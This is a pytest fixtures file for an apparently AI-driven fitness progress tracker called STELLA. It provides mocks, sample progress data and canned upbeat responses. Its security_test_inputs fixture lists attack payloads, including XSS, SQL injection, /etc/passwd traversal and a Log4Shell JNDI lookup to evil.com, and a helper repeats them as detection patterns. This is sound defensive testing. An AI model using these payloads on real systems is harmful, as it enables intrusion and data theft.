"""
Pytest configuration and fixtures for STELLA Progress Tracker testing.
Provides comprehensive test fixtures for A+ level testing coverage.
"""

import pytest
import asyncio
from datetime import datetime, timedelta
from typing import Dict, Any, List
from unittest.mock import MagicMock, AsyncMock

from agents.progress_tracker.core import (
    StellaDependencies,
    StellaConfig,
    create_test_dependencies,
    ProgressMetricType,
    AchievementCategory,
    VisualizationType,
    AnalysisType,
    PersonalityStyle,
)
from agents.progress_tracker.services import (
    ProgressSecurityService,
    ProgressDataService,
    ProgressIntegrationService,
    ProgressDataEntry,
)
from agents.progress_tracker.skills_manager import StellaSkillsManager


@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


@pytest.fixture
def stella_config():
    """Create test configuration for STELLA agent."""
    return StellaConfig(
        agent_id="test_stella_progress_tracker",
        agent_name="Test STELLA Progress Tracker",
        max_response_time=10.0,
        default_timeout=8.0,
        retry_attempts=2,
        retry_delay=0.5,
        max_progress_entries_per_request=50,
        min_comparison_days=3,
        max_comparison_days=90,
        achievement_detection_enabled=True,
        milestone_auto_detection=True,
        enable_vision_analysis=True,
        max_image_size_mb=5.0,
        personality_adaptation_enabled=True,
        celebration_intensity=0.9,
        encouragement_frequency=0.8,
        enable_audit_logging=True,
        data_encryption_enabled=True,
        cache_ttl_seconds=300,
        max_cache_size=100,
    )


@pytest.fixture
def mock_gemini_client():
    """Create mock Gemini client for AI testing."""
    mock_client = MagicMock()
    mock_client.generate_content = AsyncMock()

    # Default successful response for progress analysis
    mock_client.generate_content.return_value = {
        "success": True,
        "content": """🌟 Amazing progress analysis! Your journey is absolutely incredible!
        
        Overall Progress: You're showing fantastic improvements across multiple areas!
        Key Trends: Consistent upward trajectory in strength and endurance
        Achievements: Outstanding consistency with 85% tracking rate!
        Improvements: Consider adding more variety to your routine
        Recommendations: 
        - Keep up your amazing consistency
        - Try adding 1-2 new exercises weekly
        - Celebrate every milestone you reach!
        
        You're absolutely crushing your goals! Keep up the incredible work! 💪✨""",
        "tokens_used": 200,
        "model": "gemini-pro",
    }

    return mock_client


@pytest.fixture
def mock_personality_adapter():
    """Create mock personality adapter for STELLA."""
    mock_adapter = MagicMock()
    mock_adapter.adapt_response = AsyncMock()

    # Default STELLA personality adaptation
    mock_adapter.adapt_response.return_value = {
        "success": True,
        "adapted_message": "🎉 This is absolutely fantastic progress! I'm so excited to see your amazing improvements! Your dedication is truly inspiring! ✨",
        "confidence_score": 0.92,
        "personality_type": "ESFJ",
        "program_type": "LONGEVITY",
    }

    return mock_adapter


@pytest.fixture
def mock_supabase_client():
    """Create mock Supabase client for data operations."""
    mock_client = MagicMock()
    mock_client.table = MagicMock()
    mock_client.table.return_value = mock_client
    mock_client.insert = MagicMock()
    mock_client.select = MagicMock()
    mock_client.update = MagicMock()
    mock_client.delete = MagicMock()

    # Chain methods for fluent interface
    mock_client.insert.return_value = mock_client
    mock_client.select.return_value = mock_client
    mock_client.update.return_value = mock_client
    mock_client.delete.return_value = mock_client
    mock_client.eq = MagicMock(return_value=mock_client)
    mock_client.execute = MagicMock(return_value={"data": [], "error": None})

    return mock_client


@pytest.fixture
def mock_gcs_client():
    """Create mock Google Cloud Storage client."""
    mock_client = MagicMock()
    mock_client.upload_file = MagicMock()
    mock_client.upload_file.return_value = "gs://test-bucket/progress-image-123.jpg"
    mock_client.download_file = MagicMock()
    mock_client.delete_file = MagicMock()
    mock_client.list_files = MagicMock(return_value=[])

    return mock_client


@pytest.fixture
def mock_vision_processor():
    """Create mock vision processor for image analysis."""
    mock_processor = MagicMock()
    mock_processor.analyze_image = AsyncMock()

    # Default vision analysis response
    mock_processor.analyze_image.return_value = {
        "success": True,
        "analysis": {
            "body_composition": "Visible muscle definition improvements",
            "posture": "Good alignment and form",
            "progress_indicators": [
                "Improved muscle tone",
                "Better posture",
                "Confident stance",
            ],
            "measurements": {
                "estimated_body_fat": "15-18%",
                "muscle_definition": "moderate-high",
                "overall_fitness": "good",
            },
        },
        "confidence_score": 0.85,
        "processing_time": 2.3,
    }

    return mock_processor


@pytest.fixture
def mock_multimodal_adapter():
    """Create mock multimodal adapter."""
    mock_adapter = MagicMock()
    mock_adapter.process_inputs = AsyncMock()

    mock_adapter.process_inputs.return_value = {
        "success": True,
        "processed_data": {
            "text_analysis": "Progress tracking request",
            "image_analysis": "Body progress photo",
            "combined_insights": "User showing consistent improvement",
        },
        "confidence_score": 0.88,
    }

    return mock_adapter


@pytest.fixture
def mock_program_classification_service():
    """Create mock program classification service."""
    mock_service = MagicMock()
    mock_service.classify_user_program = MagicMock()
    mock_service.classify_user_program.return_value = {
        "program_type": "LONGEVITY",
        "confidence_score": 0.87,
        "classification_factors": [
            "wellness_focus",
            "sustainable_approach",
            "holistic_health",
        ],
    }
    return mock_service


@pytest.fixture
def mock_infrastructure_adapters():
    """Create mock infrastructure adapters."""
    return {
        "mcp_toolkit": MagicMock(),
        "state_manager_adapter": MagicMock(),
        "intent_analyzer_adapter": MagicMock(),
        "a2a_adapter": MagicMock(),
    }


@pytest.fixture
def stella_dependencies(
    mock_gemini_client,
    mock_personality_adapter,
    mock_supabase_client,
    mock_gcs_client,
    mock_program_classification_service,
    mock_vision_processor,
    mock_multimodal_adapter,
    mock_infrastructure_adapters,
):
    """Create test dependencies for STELLA agent."""
    return StellaDependencies(
        vertex_ai_client=mock_gemini_client,
        personality_adapter=mock_personality_adapter,
        supabase_client=mock_supabase_client,
        gcs_client=mock_gcs_client,
        program_classification_service=mock_program_classification_service,
        vision_processor=mock_vision_processor,
        multimodal_adapter=mock_multimodal_adapter,
        mcp_toolkit=mock_infrastructure_adapters["mcp_toolkit"],
        state_manager_adapter=mock_infrastructure_adapters["state_manager_adapter"],
        intent_analyzer_adapter=mock_infrastructure_adapters["intent_analyzer_adapter"],
        a2a_adapter=mock_infrastructure_adapters["a2a_adapter"],
    )


@pytest.fixture
def progress_security_service():
    """Create progress security service for testing."""
    return ProgressSecurityService()


@pytest.fixture
def progress_data_service():
    """Create progress data service for testing."""
    return ProgressDataService(cache_ttl_seconds=300, max_cache_size=100)


@pytest.fixture
def progress_integration_service():
    """Create progress integration service for testing."""
    return ProgressIntegrationService()


@pytest.fixture
def stella_skills_manager(stella_dependencies, stella_config):
    """Create STELLA skills manager for testing."""
    return StellaSkillsManager(dependencies=stella_dependencies, config=stella_config)


@pytest.fixture
def sample_progress_data():
    """Create sample progress data for testing."""
    return [
        ProgressDataEntry(
            user_id="test_user_123",
            data_type="weight",
            content={"weight": 75.2, "date": "2024-01-01"},
            timestamp=datetime.utcnow() - timedelta(days=10),
            tags=["morning_weigh_in"],
        ),
        ProgressDataEntry(
            user_id="test_user_123",
            data_type="strength",
            content={"exercise": "bench_press", "weight": 80, "reps": 10, "sets": 3},
            timestamp=datetime.utcnow() - timedelta(days=8),
            tags=["chest_day", "strength_training"],
        ),
        ProgressDataEntry(
            user_id="test_user_123",
            data_type="measurements",
            content={"chest": 42.0, "waist": 32.0, "arms": 15.5},
            timestamp=datetime.utcnow() - timedelta(days=5),
            tags=["monthly_measurements"],
        ),
        ProgressDataEntry(
            user_id="test_user_123",
            data_type="weight",
            content={"weight": 74.8, "date": "2024-01-15"},
            timestamp=datetime.utcnow() - timedelta(days=2),
            tags=["morning_weigh_in"],
        ),
    ]


@pytest.fixture
def sample_user_context():
    """Create sample user context for testing."""
    return {
        "user_id": "test_user_123",
        "program_type": "LONGEVITY",
        "session_id": "test_session_456",
        "conversation_id": "test_conversation_789",
        "user_preferences": {
            "communication_style": "enthusiastic",
            "coaching_approach": "supportive",
            "personality_mode": "celebratory",
        },
        "current_goals": [
            {
                "id": "weight_goal_1",
                "title": "Lose 10 pounds gradually",
                "target_value": 70.0,
                "current_value": 74.8,
                "progress_percentage": 52.0,
            },
            {
                "id": "strength_goal_1",
                "title": "Bench press 100 lbs",
                "target_value": 100,
                "current_value": 80,
                "progress_percentage": 80.0,
            },
        ],
        "active_milestones": [
            {
                "type": "consistency",
                "title": "Track for 30 days",
                "progress": 15,
                "target": 30,
            }
        ],
    }


@pytest.fixture
def sample_progress_scenarios():
    """Create sample progress tracking scenarios for testing."""
    return {
        "weight_loss_journey": {
            "message": "Show me my weight loss progress over the last 3 months",
            "expected_skill": "analyze_progress",
            "context": {
                "user_id": "test_user",
                "program_type": "LONGEVITY",
                "focus": "weight_loss",
            },
        },
        "strength_visualization": {
            "message": "Create a chart showing my bench press improvements",
            "expected_skill": "visualize_progress",
            "context": {
                "user_id": "test_user",
                "program_type": "PRIME",
                "focus": "strength",
            },
        },
        "progress_comparison": {
            "message": "Compare my progress this month vs last month",
            "expected_skill": "compare_progress",
            "context": {
                "user_id": "test_user",
                "program_type": "LONGEVITY",
                "focus": "comparison",
            },
        },
        "body_progress_analysis": {
            "message": "Analyze my progress photos",
            "expected_skill": "analyze_body_progress",
            "context": {
                "user_id": "test_user",
                "image_url": "test_image.jpg",
                "focus": "body_composition",
            },
        },
        "milestone_celebration": {
            "message": "I just hit my weight loss goal!",
            "expected_skill": "progress_celebration",
            "context": {
                "user_id": "test_user",
                "achievement": "weight_goal",
                "celebration": True,
            },
        },
        "motivation_needed": {
            "message": "I'm struggling to stay motivated with my fitness routine",
            "expected_skill": "motivational_checkin",
            "context": {
                "user_id": "test_user",
                "mood": "discouraged",
                "support_needed": True,
            },
        },
    }


@pytest.fixture
def sample_ai_responses():
    """Create sample AI responses for different progress scenarios."""
    return {
        "weight_analysis": {
            "success": True,
            "content": """🌟 Your weight loss journey is absolutely incredible! Over the past 3 months, you've lost 5.2 pounds with amazing consistency!

Key Highlights:
- Steady downward trend with healthy 1-2 lbs per week loss
- No dramatic fluctuations - showing sustainable approach
- 85% tracking consistency - that's outstanding dedication!

Celebrations:
🎉 Reached 75% of your weight loss goal!
🎉 Maintained consistency for 12 consecutive weeks!
🎉 Lost an average of 1.7 lbs per week - perfect healthy range!

Keep up this incredible momentum! You're so close to your goal! ✨""",
        },
        "strength_visualization": {
            "success": True,
            "content": """💪 Your bench press progression is absolutely phenomenal! This chart shows incredible strength gains!

Progress Highlights:
- 25% strength increase over 8 weeks
- Consistent progression every session
- Perfect form maintenance throughout

The upward trend is so inspiring! From 65 lbs to 80 lbs - that's serious strength building! Your dedication to progressive overload is paying off beautifully! 🚀""",
        },
        "motivational_support": {
            "success": True,
            "content": """💖 I hear you, and I want you to know that what you're feeling is completely normal! Every fitness journey has ups and downs, and you're not alone in this!

Let me remind you of your amazing achievements:
✨ You've been tracking consistently for 15 days
✨ You've already made incredible progress on your goals
✨ Your strength has improved by 20% since starting

You have the strength to push through this! Remember why you started, and know that I believe in you completely! One step at a time, you've got this! 🌟💪""",
        },
    }


@pytest.fixture
def performance_test_data():
    """Create data for performance testing."""
    return {
        "concurrent_users": 5,
        "requests_per_user": 3,
        "max_response_time_ms": 8000,
        "target_success_rate": 0.95,
        "test_scenarios": [
            "analyze_progress",
            "visualize_progress",
            "compare_progress",
            "progress_celebration",
            "motivational_checkin",
        ],
        "large_dataset_size": 1000,
        "stress_test_duration": 30,  # seconds
    }


@pytest.fixture
def security_test_inputs():
    """Create inputs for security testing."""
    return {
        "malicious_inputs": [
            "<script>alert('xss')</script>Show my progress",
            "'; DROP TABLE progress_data; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "\\x00\\x01\\x02\\x03 analyze progress",
        ],
        "large_inputs": [
            "A" * 10000,  # 10KB input
            "Show progress " + "B" * 50000,  # 50KB input
        ],
        "sensitive_data": {
            "user_id": "sensitive_user_123",
            "personal_info": "Weight: 150 lbs, SSN: 123-45-6789",
            "progress_data": "Lost 20 lbs, medical condition: diabetes",
        },
        "image_security": {
            "malicious_image_url": "javascript:alert('xss')",
            "invalid_formats": ["file.exe", "image.php", "data.sql"],
            "oversized_image": "image_10mb.jpg",
        },
    }


@pytest.fixture
def integration_test_config():
    """Create configuration for integration testing."""
    return {
        "external_services": {
            "fitness_tracker_api": {
                "base_url": "https://api.test-fitness.com",
                "timeout": 5,
                "retry_attempts": 2,
            },
            "nutrition_service": {
                "base_url": "https://api.test-nutrition.com",
                "timeout": 10,
                "retry_attempts": 3,
            },
            "body_analysis_service": {
                "base_url": "https://api.test-body-analysis.com",
                "timeout": 15,
                "retry_attempts": 1,
            },
        },
        "test_scenarios": [
            "service_available",
            "service_slow_response",
            "service_unavailable",
            "service_error_response",
            "circuit_breaker_open",
            "partial_service_failure",
        ],
        "circuit_breaker_settings": {
            "failure_threshold": 3,
            "timeout_seconds": 30,
            "half_open_max_calls": 2,
        },
    }


# Utility functions for testing


def create_test_progress_entry(
    user_id: str, data_type: str, **kwargs
) -> ProgressDataEntry:
    """Create test progress data entry."""
    base_content = {"value": 100.0, "unit": "default", "notes": "Test entry"}
    base_content.update(kwargs.get("content", {}))

    return ProgressDataEntry(
        user_id=user_id,
        data_type=data_type,
        content=base_content,
        timestamp=kwargs.get("timestamp", datetime.utcnow()),
        tags=kwargs.get("tags", ["test"]),
        metadata=kwargs.get("metadata", {"test": True}),
    )


def assert_stella_response_structure(
    response: Dict[str, Any], required_fields: List[str]
):
    """Assert that STELLA response has required structure."""
    assert isinstance(response, dict), "Response must be a dictionary"
    assert response.get("success") is True, "Response must indicate success"

    for field in required_fields:
        assert field in response, f"Response missing required field: {field}"


def assert_stella_personality_present(response: Dict[str, Any]):
    """Assert STELLA personality traits are present in response."""
    # Check for enthusiastic language
    text_content = str(response.get("guidance", "")) + str(response.get("analysis", ""))

    # STELLA should be enthusiastic (exclamation points, positive language)
    assert (
        "!" in text_content
        or "amazing" in text_content.lower()
        or "incredible" in text_content.lower()
    ), "Response should contain enthusiastic STELLA personality"


def assert_progress_analysis_quality(
    response: Dict[str, Any], min_recommendations: int = 2
):
    """Assert progress analysis meets quality standards."""
    assert (
        "analysis" in response or "guidance" in response
    ), "Response must contain analysis or guidance"

    # Check for recommendations
    recommendations = response.get("recommendations", [])
    assert (
        len(recommendations) >= min_recommendations
    ), f"Expected at least {min_recommendations} recommendations"

    # Check for next steps
    next_steps = response.get("next_steps", [])
    assert len(next_steps) >= 1, "Response should include next steps"


def assert_visualization_data_valid(viz_data: Dict[str, Any]):
    """Assert visualization data is valid."""
    assert "data_series" in viz_data, "Visualization must include data series"
    assert "total_points" in viz_data, "Visualization must include total points count"
    assert "date_range" in viz_data, "Visualization must include date range"

    # Validate data series structure
    data_series = viz_data["data_series"]
    assert isinstance(data_series, dict), "Data series must be a dictionary"

    for series_name, series_data in data_series.items():
        assert isinstance(series_data, list), f"Series {series_name} must be a list"
        for point in series_data:
            assert "date" in point, "Each data point must have a date"
            assert "value" in point, "Each data point must have a value"


def assert_security_compliance(data: Dict[str, Any]):
    """Assert data meets security compliance requirements."""
    # Check for required security fields
    security_fields = ["user_id", "timestamp"]
    for field in security_fields:
        if field in data:
            assert data[field], f"Security field {field} cannot be empty"

    # Check data doesn't contain obvious malicious content
    data_str = str(data)
    malicious_patterns = ["<script", "DROP TABLE", "../", "${jndi", "javascript:"]
    for pattern in malicious_patterns:
        assert (
            pattern not in data_str
        ), f"Potential malicious content detected: {pattern}"


# Cleanup fixtures


@pytest.fixture(autouse=True)
def cleanup_test_data():
    """Cleanup test data after tests."""
    yield
    # Cleanup would happen here in a real database
    pass


@pytest.fixture(scope="function")
def isolated_test_environment():
    """Provide isolated test environment for each test."""
    # Setup isolated environment
    test_env = {
        "start_time": datetime.utcnow(),
        "test_id": f"stella_test_{int(datetime.utcnow().timestamp())}",
    }

    yield test_env

    # Cleanup after test
    pass
